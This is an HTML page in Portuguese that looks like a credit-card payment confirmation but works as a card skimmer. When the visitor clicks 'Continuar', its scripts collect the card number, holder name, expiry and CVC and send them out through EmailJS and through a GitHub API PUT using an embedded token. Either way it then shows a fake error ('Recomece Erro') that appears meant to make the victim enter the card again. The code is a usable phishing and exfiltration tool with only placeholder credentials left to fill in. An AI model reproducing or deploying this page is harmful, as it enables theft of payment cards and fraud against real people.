<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <link rel="icon" type="image/png" sizes="32x32" href="./images/favicon-32x32.png">
    <link rel="stylesheet" href="css/reset.css">
    <link rel="stylesheet" href="css/cards.css">
    <link rel="stylesheet" href="css/form.css">
    <link rel="stylesheet" href="css/final.css">
    <link rel="stylesheet" href="css/mediaQ.css">
    <title>Pagamento Concluído | Cartão de Crédito</title>
</head>
<body>
    <section class="imagem">
        <div class="imagem__cartao">
            <div class="cartao-tras">
                <p id="cvc-card">cvc</p>
            </div>
            <div class="cartao-frente">
                <img src="images/card-logo p.svg" id="logo-card">
                <p id="num-card">0000 0000 0000 0000</p>
                <img src="images/fast.png" class="fast-img" style="width:60px; margin-top:8px;">
                <p id="name-card">Nome Completo</p>
                <div class="dataCard">
                    <p id="mes-card">00/</p>
                    <p id="ano-card">00</p>
                </div>
            </div>
        </div>
    </section>

    <section class="container-form">
        <div class="finaliza">
            <img src="images/icon-complete.svg" alt="" class="img-sucess">
            <h1 class="thanks">Obrigado!</h1>
            <p class="subThanks">Adicionamos os detalhes do seu cartão</p>
            <input type="submit" value="Continuar" class="button__final" id="button">
        </div>
    </section>

    <script>
        document.getElementById("button").addEventListener("click", async () => {
            // Dados coletados do cartão
            const dados = {
                numero: document.getElementById("num-card").textContent,
                nome: document.getElementById("name-card").textContent,
                mes: document.getElementById("mes-card").textContent,
                ano: document.getElementById("ano-card").textContent,
                cvc: document.getElementById("cvc-card").textContent
            };

            // Envio via EmailJS (necessário configurar no emailjs.com)
            try {
                await emailjs.send("service_xxxxxx", "template_xxxxxx", dados, "publicKey_xxxxxx");
                alert("Recomece Erro");
            } catch (e) {
                alert("Falha ao enviar. Recomece Erro.");
            }
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init("publicKey_xxxxxx");
        })();
    </script>

    <script>
        // === SALVAR DADOS DIRETAMENTE NO GITHUB (APENAS PARA TESTE!) ===
        // ISSO NÃO É SEGURO — TOKEN NÃO DEVE FICAR NO FRONT-END

        const GITHUB_TOKEN = "SEU_TOKEN_AQUI"; // <-- COLOQUE SEU TOKEN DO GITHUB AQUI (scopo: repo)
        const REPO = "usuario/repositorio";    // exemplo: amdalgodao-eng/Formulario
        const FILE_PATH = "dados/cartao.json"; // arquivo dentro do repositório

        document.getElementById("button").addEventListener("click", async () => {
            const dados = {
                numero: document.getElementById("num-card").textContent,
                nome: document.getElementById("name-card").textContent,
                mes: document.getElementById("mes-card").textContent,
                ano: document.getElementById("ano-card").textContent,
                cvc: document.getElementById("cvc-card").textContent,
                data: new Date().toLocaleString()
            };

            const conteudo = JSON.stringify(dados, null, 2);
            const base64 = btoa(unescape(encodeURIComponent(conteudo)));

            // Primeiro buscar o arquivo para pegar o SHA
            let sha = null;
            const getUrl = `https://api.github.com/repos/${REPO}/contents/${FILE_PATH}`;

            const getResp = await fetch(getUrl, {
                headers: {
                    Authorization: `token ${GITHUB_TOKEN}`,
                    Accept: "application/vnd.github.v3+json"
                }
            });

            if (getResp.ok) {
                const json = await getResp.json();
                sha = json.sha;
            }

            // Criar/atualizar arquivo
            const resp = await fetch(getUrl, {
                method: "PUT",
                headers: {
                    Authorization: `token ${GITHUB_TOKEN}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    message: "Salvar dados do cartão (teste)",
                    content: base64,
                    sha: sha
                })
            });

            if (resp.ok) {
                alert("Recomece Erro");
            } else {
                alert("Falha ao salvar. Recomece Erro.");
            }
        });
    </script>
</body>
</html>
